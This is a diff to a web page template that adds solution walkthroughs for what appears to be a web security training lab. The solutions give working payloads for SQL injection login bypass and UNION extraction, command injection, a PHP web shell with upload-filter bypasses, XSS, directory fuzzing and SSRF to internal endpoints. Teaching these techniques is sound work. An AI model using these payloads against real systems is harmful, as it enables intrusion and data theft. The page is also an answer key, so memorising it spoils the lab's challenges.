@@ -2,6 +2,7 @@
 
 {% block content %}
 <div class="container py-5 mb-5">
+  <script type="module" src="https://md-block.verou.me/md-block.js"></script>
   <style>
     .collapsible {
       cursor: pointer;
@@ -69,7 +70,21 @@
     <button class="collapsible btn btn-dark challenge-button w-100 text-truncate pt-3 pb-3 mb-2"
       style="box-shadow: 3px 3px 3px grey;"><b><span style="font-size:larger;">SQL Injection</span></b></button>
     <div class="content">
-      <p style="font-size: larger;">Solutions for SQL Injection (Update in the Future).</p>
+      <P>
+        <md-block>
+          #### Level 1: Login as Admin ####
+          ##### - username: `admin'#` or `admin' or '1'='1` #####
+          ##### - password: whatever #####
+          &nbsp;
+          #### Level 2: Login as Admin (Problem at Double Quotes) ####
+          ##### - username: `admin"#` or `admin" or "1"="1` #####
+          ##### - password: whatever #####
+          &nbsp;
+          #### Level 3: Read the Secret in Database (Flag in `users` table, in `password` column)####
+          ##### - username: `" UNION SELECT GROUP_CONCAT(password) from users #` #####
+          ##### - password: whatever #####
+        </md-block>
+      </P>
     </div>
     <br>
 
@@ -77,7 +92,21 @@
     <button class="collapsible btn btn-dark challenge-button w-100 text-truncate pt-3 pb-3 mb-2"
       style="box-shadow: 3px 3px 3px grey;"><b><span style="font-size:larger;">Command Injection</span></b></button>
     <div class="content">
-      <p style="font-size: larger;">Solutions for Command Injection (Update in the Future)</p>
+      <p>
+        <md-block>
+          #### Level 1: Read flag (extend the command by using semi-colon) ####
+          ##### - Payload: `'; cat flag_level1 #` #####
+          &nbsp;
+          #### Level 2: Read flag (extend the command using another method) ####
+          ##### - Payload 1: `'&& cat flag_level2 #` #####
+          ##### - Payload 2: `'| cat flag_level2 #` #####
+          &nbsp;
+          #### Level 3: Read flag (extend the command using another method) ####
+          ##### - Payload 1: Input in the URL: `%27%0Acat flag_level3%20%23` #####
+          ##### - Payload 2: Open Burp Suite, capture the POST Request, then change the GET param `command` value into `%27%0Acat flag_level3%20%23`
+          ##### - Payload 3: ``` ' `cat flag_level3` ``` #####
+        </md-block>
+      </p>
     </div>
     <br>
 
@@ -86,7 +115,25 @@
       style="box-shadow: 3px 3px 3px grey;"><b><span style="font-size:larger;">File Upload
           Vulnerabilities</span></b></button>
     <div class="content">
-      <p style="font-size: larger;">Solutions for File Upload Vulnerabilities (Update in the Future)</p>
+      <p>
+        <md-block>
+          #### Level 1: RCE ####
+          ##### - Solution: Upload `shell.php` with content `&lt;?php system($_GET['cmd']);` for easy RCE #####
+          &nbsp;
+          #### Level 2: RCE ####
+          ##### - Solution: Upload `shell.hack.php` with content `&lt;?php system($_GET['cmd']);` for easy RCE #####
+          &nbsp;
+          #### Level 3: RCE (Insufficient blacklist .php extension) ####
+          ##### - Solution: Upload `shell.phtml` or `shell.phar` with content `&lt;?php system($_GET['cmd']);` for easy RCE + other impact is: `upload.html` for XSS #####
+          &nbsp;
+          #### Level 4: RCE (Misconfiguration: allow upload .htaccess or allow .htaccess to config the uploaded directory) ####
+          ##### - Solution: Upload .htaccess with content: 
+          ##### `&lt;FilesMatch ".+\.ph(ar|p|tml)$"&gt;` #####
+          ##### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`SetHandler application/x-httpd-php` #####
+          ##### `&lt;/FilesMatch&gt;` #####  
+          ##### - Then, continue to upload `shell.txt` with content `&lt;?php system($_GET['cmd']);` for easy RCE #####
+        </md-block>
+      </p>
     </div>
     <br>
 
@@ -103,7 +150,18 @@
       style="box-shadow: 3px 3px 3px grey;"><b><span style="font-size:larger;">Cross - Site
           Scripting</span></b></button>
     <div class="content">
-      <p style="font-size: larger;">Solutions for Cross - Site Scripting (Update in the Future)</p>
+      <p>
+        <md-block>
+          #### Level 1: Trigger JavaScript Alert Function ####
+          ##### Payload: `&lt;script&gt;alert(origin)&lt;/script&gt;` #####
+          &nbsp;
+          #### Level 2: Trigger JavaScript Alert Function ####
+          ##### Payload: `&lt;scr&lt;script&gt;ipt&gt;alert(origin)&lt;/scr&lt;/script&gt;ipt&gt;` #####
+          &nbsp;
+          #### Level 3: Trigger JavaScript Alert Function ####
+          ##### Payload: `&lt;img src=not-exists onerror=alert(origin)&gt;` #####
+        </md-block>
+      </p>
     </div>
     <br>
 
@@ -129,7 +187,17 @@
       style="box-shadow: 3px 3px 3px grey;"><b><span style="font-size:larger;">Information
           Disclosure</span></b></button>
     <div class="content">
-      <p style="font-size: larger;">Solutions for Information Disclosure (Update in the Future)</p>
+      <p>
+        <md-block>
+          #### Flag 1: backup.zip ####
+          ##### - Solution: Use directory scanning tools such as `gobuster`, `dirbuster`, `ffuf`, etc. to scan the website with the `.zip` extension, after finish scanning, you will see the `backup.zip` file, extract the file and you will get the flag #####
+          ##### - Payload for `ffuf` tool: `ffuf -u http://&lt;SERVER_ADDRESS&gt;/FUZZ -w common.txt -e .zip` #####
+          &nbsp;
+          #### Flag 2: README.md ####
+          ##### - Solution: Use directory scanning tools such as `gobuster`, `dirbuster`, `ffuf`, etc. to scan the website with the `.md` extension, after finish scanning, you will see the `README.md` file, go to that endpoint (`http://&lt;SERVER_ADDRESS&gt;/README.md`) and you will get the flag #####
+          ##### - Payload for `ffuf` tool: `ffuf -u http://&lt;SERVER_ADDRESS&gt;/FUZZ -w common.txt -e .md` #####
+        </md-block>
+      </p>
     </div>
     <br>
 
@@ -138,7 +206,17 @@
       style="box-shadow: 3px 3px 3px grey;"><b><span style="font-size:larger;">Server - Side Request
           Forgery</span></b></button>
     <div class="content">
-      <p style="font-size: larger;">Solutions for Server - Side Request Forgery (Update in the Future)</p>
+      <p>
+        <md-block>
+          #### Level 1: No Flag ####
+          ##### - Payload SSRF to shutdown the server: `http://127.0.0.1:9001/shutdown.php` (Note that: In the real world, you may not need the port `9001`) #####
+          &nbsp;
+          #### Level 2: Access Internal `admin.php` ####
+          ##### - Payload SSRF to access internal `admin.php`: `http://127.0.0.1:9001/admin.php` #####
+          &nbsp;
+          #### Level 3 + 4 + 5 are Advanced Levels ####
+        </md-block>
+      </p>
     </div>
     <br>
 
